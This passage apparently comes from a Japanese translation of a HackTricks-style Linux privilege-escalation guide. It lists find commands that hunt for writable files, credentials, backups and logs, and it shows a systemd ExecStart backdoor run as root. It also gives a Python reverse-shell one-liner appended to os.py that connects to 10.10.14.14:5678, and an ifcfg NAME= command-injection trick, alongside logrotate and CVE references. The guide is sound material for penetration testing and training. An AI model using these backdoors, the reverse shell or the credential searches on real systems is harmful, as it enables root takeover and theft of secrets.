注意: BSDプラットフォームでは `/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` にリネームされています。

いくつかの**機密ファイルに書き込み可能か**確認する必要があります。例えば、いくつかの**サービス構成ファイル**に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** サーバを実行していて、かつ **/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる,** なら、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
あなたの backdoor は次回 tomcat が起動したときに実行されます。

### フォルダを確認

以下のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** （最後のものはおそらく読み取れないでしょうが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内の Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web ファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでください。これは **パスワードを含んでいる可能性のある複数のファイル** を検索します。\
**もう一つの興味深いツール** として利用できるのは: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、ローカルコンピュータに保存された多数のパスワードを取得するためのオープンソースのアプリケーションです (Windows, Linux & Mac)。

### ログ

ログを読めるなら、**その中から興味深い／機密情報を見つけられる**かもしれません。ログが奇妙であればあるほど、（おそらく）より興味深くなります。\
また、一部の "**不適切**" に設定された（backdoored？）**audit logs** は、投稿で説明されているように audit logs 内にパスワードを **記録する** ことを可能にする場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを読むためには、**ログを読むグループ** [**adm**](interesting-groups-linux-pe/index.html#adm-group) が非常に役立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

ファイル名（**名前**）や**内容**の中に「**password**」という単語が含まれているファイルを確認してください。また、ログ内のIPやメール、ハッシュのregexpもチェックしてください。\
ここではこれらすべてのやり方を列挙しませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを確認してください。

## 書き込み可能なファイル

### Python library hijacking

もし python スクリプトが**どこから**実行されるかが分かっていて、そのフォルダに**書き込みできる**、または**python ライブラリを変更できる**場合、OS ライブラリを修正して backdoor できます（python スクリプトが実行される場所に書き込み可能なら、os.py ライブラリをコピーして貼り付けてください）。

**backdoor the library**するには、os.py ライブラリの末尾に次の行を追加してください（IP と PORT を変更してください）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate の悪用

`logrotate` に存在する脆弱性により、ログファイルやその親ディレクトリに対して **書き込み権限** を持つユーザーが特権昇格を引き起こす可能性があります。これは `logrotate` が多くの場合 **root** として実行され、特に _**/etc/bash_completion.d/**_ のようなディレクトリで任意のファイルを実行するよう操作できるためです。権限は _/var/log_ だけでなく、ログローテーションが適用されるすべてのディレクトリで確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` バージョン `3.18.0` およびそれ以前に影響します

脆弱性の詳細は次のページで確認できます: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

この脆弱性は [**logrotten**](https://github.com/whotwagner/logrotten) を使って悪用できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** に非常によく似ています。ログを変更できることが分かった場合は、誰がそのログを管理しているかを確認し、ログをシンボリックリンクに差し替えて特権昇格が可能かどうかを確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性リファレンス:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

何らかの理由で、ユーザーが `ifcf-<whatever>` スクリプトを _/etc/sysconfig/network-scripts_ に **書き込み** できる、または既存のものを **修正** できる場合、あなたの **system is pwned** です。

Network scripts（例えば _ifcg-eth0_）はネットワーク接続に使用され、見た目は .INI ファイルそのものです。しかし、それらは Linux 上で Network Manager (dispatcher.d) によって \~sourced\~ されます。

私の場合、これらのネットワークスクリプト内の `NAME=` の値が正しく処理されていません。名前に **空白/ブランクスペース** があると、システムは空白以降の部分を実行しようとします。つまり、**最初の空白以降のすべてが root として実行される**、ということです。

例えば: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間の空白に注意_)

### **init, init.d, systemd, and rc.d**

ディレクトリ `/etc/init.d` は System V init (SysVinit) 用の **scripts** の置き場です。`start`、`stop`、`restart`、場合によっては `reload` といったサービス操作用のスクリプトが含まれ、これらは直接実行するか `/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系では代替パスとして `/etc/rc.d/init.d` が使われます。

一方で `/etc/init` は **Upstart** に関連しており、Ubuntu が導入した新しい **service management** で、サービス管理用の設定ファイルを使用します。Upstart への移行後も互換レイヤーにより SysVinit スクリプトが Upstart 設定と並行して利用されます。

**systemd** はモダンな初期化およびサービスマネージャとして登場し、オンデマンドのデーモン起動、automount 管理、システム状態のスナップショットなどの高度な機能を提供します。ファイルはディストリビューションパッケージ向けに `/usr/lib/systemd/`、管理者による変更用に `/etc/systemd/system/` に整理され、システム管理が効率化されます。

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android の rooting frameworks は一般に syscall をフックして特権カーネル機能をユーザースペースの manager に公開します。弱い manager 認証（例：FD-order に基づく署名チェックや脆弱なパスワード方式）があると、ローカルアプリが manager を偽装して既に root 化されたデバイスで root に昇格することが可能になります。詳細とエクスプロイトの情報は以下を参照してください：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations における正規表現駆動のサービス検出は、プロセスのコマンドラインからバイナリパスを抽出し、特権コンテキストで -v を付けて実行することがあります。許容度の高いパターン（例：\S の使用）は、書き込み可能な場所（例：/tmp/httpd）に配置した攻撃者のリスナーとマッチし、root として実行される可能性があり（CWE-426 Untrusted Search Path）、脆弱性につながります。

詳しくは、他の discovery/monitoring スタックにも適用可能な一般化パターンを以下で確認してください：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
